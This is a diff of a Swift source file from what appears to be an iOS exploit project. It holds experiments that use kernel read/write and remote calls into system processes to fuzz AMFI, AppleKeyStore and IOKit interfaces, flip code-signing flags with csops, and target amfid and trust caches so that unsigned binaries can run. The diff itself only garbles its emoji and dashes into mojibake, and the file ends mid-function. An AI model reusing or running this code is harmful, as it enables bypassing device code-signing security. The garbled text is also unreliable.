@@ -1,8 +1,8 @@
-//
+﻿//
 //  AMFIExperimentView.swift
 //  DSPloit
 //
-//  AMFI Bypass Experiments — test binary execution from root context
+//  AMFI Bypass Experiments â€” test binary execution from root context
 //  Goal: find a way to execute unsigned binaries
 //
 //  NOTE: Experiments 1-53 removed (legacy probes). Only keeping 54-59 (active research).
@@ -40,7 +40,7 @@ struct AMFIExperimentView: View {
                             Text("Running: \(runningLabel)")
                                 .font(.caption.bold())
                                 .foregroundStyle(.red)
-                            Text("Do NOT close app — will cause panic!")
+                            Text("Do NOT close app â€” will cause panic!")
                                 .font(.system(size: 9))
                                 .foregroundStyle(.orange)
                         }
@@ -66,7 +66,7 @@ struct AMFIExperimentView: View {
                 
                 Button(action: runAmfidRC) {
                     HStack {
-                        Label("⚡ amfid RC (Exp 60)", systemImage: "bolt.shield")
+                        Label("âš¡ amfid RC (Exp 60)", systemImage: "bolt.shield")
                             .foregroundStyle(isRunning ? .gray : .orange)
                         Spacer()
                         if isRunning && runningLabel.contains("amfid") {
@@ -87,7 +87,7 @@ struct AMFIExperimentView: View {
             } header: {
                 Label("Experiments", systemImage: "flask")
             } footer: {
-                Text("⚠️ amfid RC may take 5-10s or hang. Do NOT kill app while running!")
+                Text("âš ï¸ amfid RC may take 5-10s or hang. Do NOT kill app while running!")
                     .font(.system(size: 9))
             }
             
@@ -169,7 +169,7 @@ struct AMFIExperimentView: View {
             experimentResults.append(exp56)
             
             // ============================================
-            // Experiment 57: AppleKeyStore probe (DISABLED — not directly useful for AMFI bypass)
+            // Experiment 57: AppleKeyStore probe (DISABLED â€” not directly useful for AMFI bypass)
             // ============================================
             // let exp57 = self.expKeyStoreProbe()
             // experimentResults.append(exp57)
@@ -187,33 +187,33 @@ struct AMFIExperimentView: View {
             experimentResults.append(exp59)
             
             // ============================================
-            // 🔥🔥🔥🔥🔥🔥 Experiment 60: amfid kernel research
-            // ⚠️ DISABLED in batch run — RC init can hang/timeout
+            // ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Experiment 60: amfid kernel research
+            // âš ï¸ DISABLED in batch run â€” RC init can hang/timeout
             // Use "Test amfid RC" button separately
             // ============================================
             experimentResults.append(ExperimentResult(
-                name: "🔥🔥🔥🔥🔥🔥 amfid research",
+                name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ amfid research",
                 success: false,
                 detail: "Use 'Test amfid RC' button (safe kernel reads only)",
                 timestamp: Date()
             ))
             
             // ============================================
-            // 🔥🔥🔥🔥🔥🔥🔥 Experiment 61: FINAL ASSAULT
+            // ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Experiment 61: FINAL ASSAULT
             // All remaining bypass paths combined
             // ============================================
             let exp61 = self.expFinalAssault(rc: rc)
             experimentResults.append(exp61)
             
             // ============================================
-            // 🔥🔥🔥🔥🔥🔥🔥🔥 Experiment 62: Trust Cache — DISABLED (panic)
+            // ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Experiment 62: Trust Cache â€” DISABLED (panic)
             // Reading __DATA addresses beyond pmap_cs causes panic
             // Socket KRW zone does NOT extend to trust cache region
             // ============================================
             experimentResults.append(ExperimentResult(
-                name: "🔥🔥🔥🔥🔥🔥🔥🔥 Trust Cache",
+                name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Trust Cache",
                 success: false,
-                detail: "⚠️ DISABLED — reading trust cache addresses causes panic.\nSocket KRW zone limited to proc/task/pmap_cs area only.\nTrust cache region (~57KB away) is in different zone.",
+                detail: "âš ï¸ DISABLED â€” reading trust cache addresses causes panic.\nSocket KRW zone limited to proc/task/pmap_cs area only.\nTrust cache region (~57KB away) is in different zone.",
                 timestamp: Date()
             ))
             
@@ -295,28 +295,28 @@ struct AMFIExperimentView: View {
             return ExperimentResult(
                 name: name,
                 success: true,
-                detail: "✅ PID=\(pid), exit=\(exitStatus >> 8), ret=\(ret)",
+                detail: "âœ… PID=\(pid), exit=\(exitStatus >> 8), ret=\(ret)",
                 timestamp: Date()
             )
         }
         
-        // Failed — get errno
+        // Failed â€” get errno
         let err = remote_errno(rc)
         RootExecutor.rcall(rc, "free", binAddr)
         return ExperimentResult(
             name: name,
             success: false,
-            detail: "❌ ret=\(ret), errno=\(err), pid=\(pid)",
+            detail: "âŒ ret=\(ret), errno=\(err), pid=\(pid)",
             timestamp: Date()
         )
     }
     
     // MARK: - Experiment 54: IOKit Driver Probe
     
-    /// IOKit driver probe — find accessible user clients for potential exploitation
+    /// IOKit driver probe â€” find accessible user clients for potential exploitation
     /// Some IOKit drivers have bugs in external methods (OOB read/write)
     private func expIOKitProbe(rc: RemoteCall) -> ExperimentResult {
-        var detail = "IOKit Driver Probe — finding accessible user clients\n\n"
+        var detail = "IOKit Driver Probe â€” finding accessible user clients\n\n"
         
         // From SpringBoard (has more IOKit access than launchd)
         guard let sb = dspmgr.shared.sbProc else {
@@ -370,7 +370,7 @@ struct AMFIExperimentView: View {
                     let connect = sb[connectAddr].value32()
                     
                     if openRet == 0 && connect != 0 {
-                        detail += "✅ \(service): OPENED! connect=\(connect)\n"
+                        detail += "âœ… \(service): OPENED! connect=\(connect)\n"
                         RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
                     } else {
                         detail += "  \(service): found but open failed (ret=0x\(String(format: "%x", openRet)))\n"
@@ -382,9 +382,9 @@ struct AMFIExperimentView: View {
             RootExecutor.rcall(sb, "free", nameAddr)
         }
         
-        let hasOpen = detail.contains("✅")
+        let hasOpen = detail.contains("âœ…")
         if hasOpen {
-            detail += "\n✅ Accessible user clients found!\n"
+            detail += "\nâœ… Accessible user clients found!\n"
             detail += "These can be fuzzed for OOB read/write vulnerabilities.\n"
             detail += "External methods might give us access to different kernel zones!\n"
         }
@@ -394,7 +394,7 @@ struct AMFIExperimentView: View {
     
     // MARK: - Experiment 55: CoreTrust Certificate Probe
     
-    /// CoreTrust certificate probe — test what signatures iOS 18.2 accepts
+    /// CoreTrust certificate probe â€” test what signatures iOS 18.2 accepts
     /// Try spawning binary with different signature types
     private func expCoreTrustProbe(rc: RemoteCall) -> ExperimentResult {
         let mem = rc.trojanMem
@@ -433,7 +433,7 @@ struct AMFIExperimentView: View {
         let csops1 = RootExecutor.rcall(rc, "csops", 1, 0, statusAddr, 4)
         let cs1Status = rc[statusAddr].value32()
         detail += "\nlaunchd csops: ret=\(csops1), flags=0x\(String(format: "%x", cs1Status))\n"
-        if cs1Status & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY ✅\n" }
+        if cs1Status & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY âœ…\n" }
         
         // Step 3: Check if we can set CS_DEBUGGED on ourselves via csops
         // CS_OPS_SET_STATUS = 8 (might be restricted)
@@ -450,12 +450,12 @@ struct AMFIExperimentView: View {
         detail += "After set: flags=0x\(String(format: "%x", afterFlags))\n"
         
         if afterFlags & 0x800 != 0 && csStatus & 0x800 == 0 {
-            detail += "\n✅✅✅ CS_DEBUGGED SET SUCCESSFULLY! ✅✅✅\n"
+            detail += "\nâœ…âœ…âœ… CS_DEBUGGED SET SUCCESSFULLY! âœ…âœ…âœ…\n"
             detail += "This might allow loading unsigned code in our process!\n"
             detail += "CS_DEBUGGED disables some AMFI checks!\n"
         }
         
-        // Step 4: Try CS_OPS_MARKKILL = 6 (mark as killable — might affect enforcement)
+        // Step 4: Try CS_OPS_MARKKILL = 6 (mark as killable â€” might affect enforcement)
         // And CS_OPS_CLEARPLATFORM = 13
         detail += "\nOther csops experiments:\n"
         let csopsTests: [(String, UInt64)] = [
@@ -471,7 +471,7 @@ struct AMFIExperimentView: View {
             detail += "  \(name): ret=\(r)\n"
         }
         
-        let success = detail.contains("✅✅✅")
+        let success = detail.contains("âœ…âœ…âœ…")
         return ExperimentResult(name: "CoreTrust/csops probe", success: success, detail: detail, timestamp: Date())
     }
     
@@ -485,7 +485,7 @@ struct AMFIExperimentView: View {
     /// - Return internal state we can use
     private func expAMFIExternalMethods() -> ExperimentResult {
         guard let sb = dspmgr.shared.sbProc else {
-            return ExperimentResult(name: "🔥🔥🔥 AMFI methods", success: false, detail: "No SB RC", timestamp: Date())
+            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: false, detail: "No SB RC", timestamp: Date())
         }
         
         let mem = sb.trojanMem
@@ -498,12 +498,12 @@ struct AMFIExperimentView: View {
         let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
         let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
         let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
-        // IOConnectCallScalarMethod(connect, selector, input, inputCnt, output, outputCnt) — 6 params
+        // IOConnectCallScalarMethod(connect, selector, input, inputCnt, output, outputCnt) â€” 6 params
         let ioConnectCallScalar = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOConnectCallScalarMethod"))
         
         guard ioServiceMatching != 0 && ioConnectCallScalar != 0 else {
             detail += "IOKit functions not available\n"
-            return ExperimentResult(name: "🔥🔥🔥 AMFI methods", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: false, detail: detail, timestamp: Date())
         }
         
         // Open AMFI user client
@@ -514,7 +514,7 @@ struct AMFIExperimentView: View {
         guard svc != 0 else {
             detail += "AMFI service not found\n"
             RootExecutor.rcall(sb, "free", nameAddr)
-            return ExperimentResult(name: "🔥🔥🔥 AMFI methods", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: false, detail: detail, timestamp: Date())
         }
         
         let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
@@ -526,14 +526,14 @@ struct AMFIExperimentView: View {
         guard openRet == 0 && connect != 0 else {
             detail += "Failed to open AMFI: ret=0x\(String(format: "%x", openRet))\n"
             RootExecutor.rcall(sb, "free", nameAddr)
-            return ExperimentResult(name: "🔥🔥🔥 AMFI methods", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: false, detail: detail, timestamp: Date())
         }
         
-        detail += "✅ AMFI user client opened! connect=\(connect)\n\n"
+        detail += "âœ… AMFI user client opened! connect=\(connect)\n\n"
         detail += "Fuzzing external methods (selectors 0-15)...\n\n"
         
         // IOConnectCallScalarMethod(connect, selector, input, inputCnt, output, outputCnt)
-        // Only 6 params — safe for ARM64 register calling convention
+        // Only 6 params â€” safe for ARM64 register calling convention
         
         // Setup output buffer (space for 16 uint64 outputs)
         let scalarOutAddr = mem + 0x1C00
@@ -566,7 +566,7 @@ struct AMFIExperimentView: View {
             let retHex = String(format: "0x%x", ret)
             
             if ret == 0 {
-                detail += "✅ Selector \(selector): SUCCESS! outCnt=\(outCnt)\n"
+                detail += "âœ… Selector \(selector): SUCCESS! outCnt=\(outCnt)\n"
                 foundMethods.append(selector)
                 
                 // Read scalar outputs
@@ -579,14 +579,14 @@ struct AMFIExperimentView: View {
                     detail += "\n"
                 }
             } else if ret == 0xe00002bc {
-                // kIOReturnBadArgument — selector doesn't exist
+                // kIOReturnBadArgument â€” selector doesn't exist
                 detail += "   Selector \(selector): not implemented (0xe00002bc)\n"
             } else if ret == 0xe00002c2 {
                 // kIOReturnUnsupported or bad input count
-                detail += "⚠️ Selector \(selector): needs input! (ret=\(retHex))\n"
+                detail += "âš ï¸ Selector \(selector): needs input! (ret=\(retHex))\n"
                 foundMethods.append(selector)
             } else if ret == 0xe0000001 {
-                detail += "⚠️ Selector \(selector): general error (ret=\(retHex))\n"
+                detail += "âš ï¸ Selector \(selector): general error (ret=\(retHex))\n"
                 foundMethods.append(selector)
             } else {
                 detail += "   Selector \(selector): ret=\(retHex)\n"
@@ -615,7 +615,7 @@ struct AMFIExperimentView: View {
                 
                 if ret2 == 0 && outCnt2 > 0 {
                     let val = sb[scalarOutAddr].value64()
-                    detail += "    → output[0] = 0x\(String(format: "%llx", val))\n"
+                    detail += "    â†’ output[0] = 0x\(String(format: "%llx", val))\n"
                 }
             }
         }
@@ -632,17 +632,17 @@ struct AMFIExperimentView: View {
         }
         
         let success = !foundMethods.isEmpty
-        return ExperimentResult(name: "🔥🔥🔥 AMFI methods", success: success, detail: detail, timestamp: Date())
+        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: success, detail: detail, timestamp: Date())
     }
     
     // MARK: - Experiment 57: AppleKeyStore Probe
     
     /// Experiment 57: AppleKeyStore external method probe
-    /// KeyStore manages encryption keys — if we can extract/manipulate keys
+    /// KeyStore manages encryption keys â€” if we can extract/manipulate keys
     /// we might be able to sign our own binaries or decrypt protected data
     private func expKeyStoreProbe() -> ExperimentResult {
         guard let sb = dspmgr.shared.sbProc else {
-            return ExperimentResult(name: "🔥🔥 KeyStore probe", success: false, detail: "No SB RC", timestamp: Date())
+            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: false, detail: "No SB RC", timestamp: Date())
         }
         
         let mem = sb.trojanMem
@@ -656,7 +656,7 @@ struct AMFIExperimentView: View {
         
         guard ioServiceMatching != 0 && ioConnectCallScalar != 0 else {
             detail += "IOKit functions not available in SpringBoard\n"
-            return ExperimentResult(name: "🔥🔥 KeyStore probe", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: false, detail: detail, timestamp: Date())
         }
         
         // Open AppleKeyStore
@@ -667,7 +667,7 @@ struct AMFIExperimentView: View {
         guard svc != 0 else {
             detail += "AppleKeyStore service not found\n"
             RootExecutor.rcall(sb, "free", nameAddr)
-            return ExperimentResult(name: "🔥🔥 KeyStore probe", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: false, detail: detail, timestamp: Date())
         }
         
         let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
@@ -679,10 +679,10 @@ struct AMFIExperimentView: View {
         guard openRet == 0 && connect != 0 else {
             detail += "Failed to open KeyStore: ret=0x\(String(format: "%x", openRet))\n"
             RootExecutor.rcall(sb, "free", nameAddr)
-            return ExperimentResult(name: "🔥🔥 KeyStore probe", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: false, detail: detail, timestamp: Date())
         }
         
-        detail += "✅ AppleKeyStore opened! connect=\(connect)\n\n"
+        detail += "âœ… AppleKeyStore opened! connect=\(connect)\n\n"
         
         // Fuzz selectors 0-20 (KeyStore has many methods)
         let scalarOutAddr = mem + 0x1C00
@@ -702,14 +702,14 @@ struct AMFIExperimentView: View {
             
             if ret == 0 {
                 let outCnt = sb[scalarOutCntAddr].value32()
-                detail += "✅ Selector \(selector): SUCCESS! out=\(outCnt)\n"
+                detail += "âœ… Selector \(selector): SUCCESS! out=\(outCnt)\n"
                 foundMethods.append(selector)
                 if outCnt > 0 {
                     let val = sb[scalarOutAddr].value64()
                     detail += "   output[0] = 0x\(String(format: "%llx", val))\n"
                 }
             } else if ret != 0xe00002bc && ret != 0xe00002c7 {
-                detail += "⚠️ Selector \(selector): ret=0x\(String(format: "%x", ret)) (exists but needs input)\n"
+                detail += "âš ï¸ Selector \(selector): ret=0x\(String(format: "%x", ret)) (exists but needs input)\n"
                 foundMethods.append(selector)
             }
         }
@@ -724,12 +724,12 @@ struct AMFIExperimentView: View {
         detail += "- Create new key bags\n"
         detail += "- Manipulate trust anchors\n"
         
-        return ExperimentResult(name: "🔥🔥 KeyStore probe", success: !foundMethods.isEmpty, detail: detail, timestamp: Date())
+        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: !foundMethods.isEmpty, detail: detail, timestamp: Date())
     }
     
     // MARK: - Experiment 58: AMFI Struct Method Deep Probe
     
-    /// Experiment 58: AMFI methods need struct input — probe with various struct formats
+    /// Experiment 58: AMFI methods need struct input â€” probe with various struct formats
     /// Known AMFI IOKit methods typically accept:
     /// - CDHash (20 bytes SHA1 or 32 bytes SHA256) for binary whitelisting
     /// - PID (4 bytes) for process-specific operations
@@ -739,7 +739,7 @@ struct AMFIExperimentView: View {
     /// We try different struct sizes and content to find what each selector expects
     private func expAMFIStructProbe() -> ExperimentResult {
         guard let sb = dspmgr.shared.sbProc else {
-            return ExperimentResult(name: "🔥🔥🔥🔥 AMFI struct", success: false, detail: "No SB RC", timestamp: Date())
+            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: false, detail: "No SB RC", timestamp: Date())
         }
         
         let mem = sb.trojanMem
@@ -751,7 +751,7 @@ struct AMFIExperimentView: View {
         
         guard ioConnectCallStruct != 0 else {
             detail += "IOConnectCallStructMethod not available\n"
-            return ExperimentResult(name: "🔥🔥🔥🔥 AMFI struct", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: false, detail: detail, timestamp: Date())
         }
         
         // Re-open AMFI user client
@@ -762,7 +762,7 @@ struct AMFIExperimentView: View {
         guard svc != 0 else {
             detail += "AMFI service not found\n"
             RootExecutor.rcall(sb, "free", nameAddr)
-            return ExperimentResult(name: "🔥🔥🔥🔥 AMFI struct", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: false, detail: detail, timestamp: Date())
         }
         
         let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
@@ -774,13 +774,13 @@ struct AMFIExperimentView: View {
         guard openRet == 0 && connect != 0 else {
             detail += "Failed to open AMFI: ret=0x\(String(format: "%x", openRet))\n"
             RootExecutor.rcall(sb, "free", nameAddr)
-            return ExperimentResult(name: "🔥🔥🔥🔥 AMFI struct", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: false, detail: detail, timestamp: Date())
         }
         
-        detail += "✅ AMFI opened: connect=\(connect)\n\n"
+        detail += "âœ… AMFI opened: connect=\(connect)\n\n"
         
         // IOConnectCallStructMethod(connect, selector, inputStruct, inputSize, outputStruct, &outputSize)
-        // 6 params — safe for ARM64
+        // 6 params â€” safe for ARM64
         
         let structInAddr = mem + 0x2200   // input struct buffer (256 bytes)
         let structOutAddr = mem + 0x2400  // output struct buffer (256 bytes)
@@ -825,7 +825,7 @@ struct AMFIExperimentView: View {
                 let outSize = sb[structOutSizeAddr].value64()
                 
                 if ret == 0 {
-                    detail += "  ✅ size=\(size): SUCCESS! outSize=\(outSize)\n"
+                    detail += "  âœ… size=\(size): SUCCESS! outSize=\(outSize)\n"
                     foundWorking.append((selector, "struct_size=\(size)"))
                     
                     // Read output
@@ -837,8 +837,8 @@ struct AMFIExperimentView: View {
                     }
                     break  // found working size for this selector
                 } else if ret != 0xe00002c2 && ret != 0xe00002c7 && ret != 0xe00002bc {
-                    // Different error — interesting!
-                    detail += "  ⚠️ size=\(size): ret=0x\(String(format: "%x", ret))\n"
+                    // Different error â€” interesting!
+                    detail += "  âš ï¸ size=\(size): ret=0x\(String(format: "%x", ret))\n"
                 }
             }
         }
@@ -873,7 +873,7 @@ struct AMFIExperimentView: View {
         let cdOutSize = sb[structOutSizeAddr].value64()
         detail += "  ret=0x\(String(format: "%x", cdRet)), outSize=\(cdOutSize)\n"
         if cdRet == 0 {
-            detail += "  ✅ CDHash-sized input ACCEPTED!\n"
+            detail += "  âœ… CDHash-sized input ACCEPTED!\n"
             foundWorking.append((5, "CDHash input"))
         }
         
@@ -895,7 +895,7 @@ struct AMFIExperimentView: View {
         detail += "  2 scalars [1,0]: ret=0x\(String(format: "%x", s9ret)), outCnt=\(s9out)\n"
         if s9ret == 0 {
             let val = sb[scalarOutAddr].value64()
-            detail += "  ✅ output[0] = 0x\(String(format: "%llx", val))\n"
+            detail += "  âœ… output[0] = 0x\(String(format: "%llx", val))\n"
             foundWorking.append((9, "2 scalar inputs"))
         }
         
@@ -912,7 +912,7 @@ struct AMFIExperimentView: View {
         detail += "  [PID=1, op=0]: ret=0x\(String(format: "%x", s2ret)), outCnt=\(s2out)\n"
         if s2ret == 0 {
             let val = sb[scalarOutAddr].value64()
-            detail += "  ✅ output[0] = 0x\(String(format: "%llx", val))\n"
+            detail += "  âœ… output[0] = 0x\(String(format: "%llx", val))\n"
             foundWorking.append((2, "2 scalar [PID,op]"))
         }
         
@@ -930,7 +930,7 @@ struct AMFIExperimentView: View {
         detail += "  [1,0,0]: ret=0x\(String(format: "%x", s4ret)), outCnt=\(s4out)\n"
         if s4ret == 0 {
             let val = sb[scalarOutAddr].value64()
-            detail += "  ✅ output[0] = 0x\(String(format: "%llx", val))\n"
+            detail += "  âœ… output[0] = 0x\(String(format: "%llx", val))\n"
             foundWorking.append((4, "3 scalar inputs"))
         }
         
@@ -948,12 +948,12 @@ struct AMFIExperimentView: View {
             detail += "Methods might need specific entitlement or token.\n"
             detail += "NEXT: try with 4,5,6 scalar inputs or larger structs\n"
         } else {
-            detail += "\n🔥 FOUND WORKING AMFI METHODS!\n"
+            detail += "\nðŸ”¥ FOUND WORKING AMFI METHODS!\n"
             detail += "Next: determine what each method DOES\n"
             detail += "Try: pass our binary's CDHash to whitelist it\n"
         }
         
-        return ExperimentResult(name: "🔥🔥🔥🔥 AMFI struct", success: !foundWorking.isEmpty, detail: detail, timestamp: Date())
+        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: !foundWorking.isEmpty, detail: detail, timestamp: Date())
     }
     
     // MARK: - Experiment 59: AMFI from Launchd + amfid Hunt
@@ -961,7 +961,7 @@ struct AMFIExperimentView: View {
     /// Experiment 59: Try AMFI IOKit from LAUNCHD context (PID 1 = most trusted)
     /// Also: find amfid daemon and try to get its task port
     /// amfid is the userspace daemon that handles AMFI policy decisions
-    /// If we can control amfid → we control code signing decisions!
+    /// If we can control amfid â†’ we control code signing decisions!
     private func expAMFIFromLaunchd(rc: RemoteCall) -> ExperimentResult {
         let mem = rc.trojanMem
         var detail = "AMFI from Launchd + amfid Hunt\n\n"
@@ -996,7 +996,7 @@ struct AMFIExperimentView: View {
                     detail += "IOServiceOpen: ret=0x\(String(format: "%x", openRet)), connect=\(amfiConnect)\n"
                     
                     if openRet == 0 && amfiConnect != 0 {
-                        detail += "✅ AMFI opened from launchd!\n\n"
+                        detail += "âœ… AMFI opened from launchd!\n\n"
                         
                         // Try selectors with different scalar counts from launchd
                         let scalarInAddr = mem + 0x2000
@@ -1045,17 +1045,17 @@ struct AMFIExperimentView: View {
                         
                         // Check if any succeeded
                         if r2 == 0 || r2b == 0 || r5 == 0 || r9 == 0 {
-                            detail += "\n🔥🔥🔥 LAUNCHD HAS AMFI ACCESS!\n"
+                            detail += "\nðŸ”¥ðŸ”¥ðŸ”¥ LAUNCHD HAS AMFI ACCESS!\n"
                             let outVal = rc[scalarOutAddr].value64()
                             detail += "output[0] = 0x\(String(format: "%llx", outVal))\n"
                         } else {
-                            detail += "\nLaunchd also rejected — needs specific entitlement\n"
+                            detail += "\nLaunchd also rejected â€” needs specific entitlement\n"
                         }
                         
                         // Close
                         RootExecutor.rcall(rc, "IOServiceClose", UInt64(amfiConnect))
                     } else {
-                        detail += "❌ Cannot open AMFI from launchd\n"
+                        detail += "âŒ Cannot open AMFI from launchd\n"
                     }
                 }
             }
@@ -1067,7 +1067,7 @@ struct AMFIExperimentView: View {
         // Part 2: Find amfid daemon
         detail += "\n=== Part 2: Hunt for amfid ===\n"
         
-        // amfid is the AMFI daemon — it makes code signing decisions
+        // amfid is the AMFI daemon â€” it makes code signing decisions
         // If we can find it and RC into it, we have full AMFI control
         let amfidProc = mgr.findProc(name: "amfid")
         detail += "amfid proc in kernel: 0x\(String(format: "%llx", amfidProc))\n"
@@ -1077,7 +1077,7 @@ struct AMFIExperimentView: View {
             let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
             detail += "amfid PID: \(amfidPid)\n"
             
-            // Read amfid's proc_ro → task
+            // Read amfid's proc_ro â†’ task
             let amfidProcRo = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
             let amfidTask = amfidProcRo != 0 ? ds_kread64(amfidProcRo + UInt64(off_proc_ro_pr_task)) : 0
             detail += "amfid proc_ro: 0x\(String(format: "%llx", amfidProcRo))\n"
@@ -1086,12 +1086,12 @@ struct AMFIExperimentView: View {
             // Read amfid's cs_flags
             let amfidCSFlags = mgr.readCSFlags(pid: Int32(bitPattern: amfidPid))
             detail += "amfid cs_flags: 0x\(String(format: "%x", amfidCSFlags))\n"
-            if amfidCSFlags & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY ✅\n" }
+            if amfidCSFlags & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY âœ…\n" }
             if amfidCSFlags & 0x4000 != 0 { detail += "  CS_GET_TASK_ALLOW\n" }
             
-            detail += "\n✅ amfid FOUND! PID=\(amfidPid)\n"
+            detail += "\nâœ… amfid FOUND! PID=\(amfidPid)\n"
             detail += "amfid is the code signing policy daemon.\n"
-            detail += "If we can RC into amfid → full AMFI control!\n"
+            detail += "If we can RC into amfid â†’ full AMFI control!\n"
             detail += "NEXT: try RemoteCall init to amfid process\n"
         } else {
             detail += "amfid not found in process list\n"
@@ -1111,7 +1111,7 @@ struct AMFIExperimentView: View {
         // Part 3: Trust Cache research
         detail += "\n=== Part 3: Trust Cache Info ===\n"
         detail += "Trust caches are kernel-resident lists of allowed CDHashes.\n"
-        detail += "If we can ADD our binary's CDHash to a trust cache → bypass AMFI!\n"
+        detail += "If we can ADD our binary's CDHash to a trust cache â†’ bypass AMFI!\n"
         detail += "Trust cache structs are in kernel heap (kalloc zone).\n"
         detail += "Our socket KRW might not reach them, but worth investigating.\n"
         
@@ -1142,15 +1142,15 @@ struct AMFIExperimentView: View {
         RootExecutor.rcall(rc, "free", devNameAddr)
         
         let success = amfidProc != 0 || (amfiConnect != 0)
-        return ExperimentResult(name: "🔥🔥🔥🔥🔥 AMFI launchd+amfid", success: success, detail: detail, timestamp: Date())
+        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI launchd+amfid", success: success, detail: detail, timestamp: Date())
     }
     
-    // MARK: - 🔥🔥🔥🔥🔥🔥 Experiment 60: RemoteCall into amfid
+    // MARK: - ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Experiment 60: RemoteCall into amfid
     
     /// Experiment 60: Initialize RemoteCall into amfid daemon!
     /// amfid (PID 52) is the code signing policy daemon.
     /// It has the entitlements needed to call AMFI IOKit methods.
-    /// If we can RC into amfid → call AMFI methods FROM amfid → bypass!
+    /// If we can RC into amfid â†’ call AMFI methods FROM amfid â†’ bypass!
     ///
     /// Strategy:
     /// 1. Find amfid PID (already found: 52)
@@ -1159,34 +1159,34 @@ struct AMFIExperimentView: View {
     /// 4. amfid has com.apple.private.amfi.can-execute entitlement!
     private func expRCIntoAmfid(rc: RemoteCall) -> ExperimentResult {
         let mgr = dspmgr.shared
-        var detail = "🔥 amfid Kernel Research\n\n"
+        var detail = "ðŸ”¥ amfid Kernel Research\n\n"
         
-        // RC to amfid HANGS (confirmed — single-threaded daemon)
+        // RC to amfid HANGS (confirmed â€” single-threaded daemon)
         // Direct task struct reads PANIC (itk_space, threads in wrong zone)
         // Only safe reads: proc, proc_ro, pid, cs_flags
         
         // Step 1: Find amfid
         let amfidProc = mgr.findProc(name: "amfid")
         guard amfidProc != 0 else {
-            detail += "❌ amfid not found in process list\n"
-            return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥 amfid research", success: false, detail: detail, timestamp: Date())
+            detail += "âŒ amfid not found in process list\n"
+            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ amfid research", success: false, detail: detail, timestamp: Date())
         }
         
         let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
         detail += "amfid PID: \(amfidPid)\n"
         detail += "amfid proc: 0x\(String(format: "%llx", amfidProc))\n"
         
-        // Step 2: Read proc_ro (SAFE — same zone as proc)
+        // Step 2: Read proc_ro (SAFE â€” same zone as proc)
         let amfidProcRo = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
         detail += "amfid proc_ro: 0x\(String(format: "%llx", amfidProcRo))\n"
         
-        // Step 3: Read cs_flags (SAFE — in proc_ro)
+        // Step 3: Read cs_flags (SAFE â€” in proc_ro)
         let amfidCSFlags = mgr.readCSFlags(pid: Int32(bitPattern: amfidPid))
         detail += "amfid cs_flags: 0x\(String(format: "%x", amfidCSFlags))\n"
         if amfidCSFlags & 0x001 != 0 { detail += "  CS_VALID\n" }
         if amfidCSFlags & 0x004 != 0 { detail += "  CS_HARD\n" }
         if amfidCSFlags & 0x008 != 0 { detail += "  CS_KILL\n" }
-        if amfidCSFlags & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY ✅\n" }
+        if amfidCSFlags & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY âœ…\n" }
         
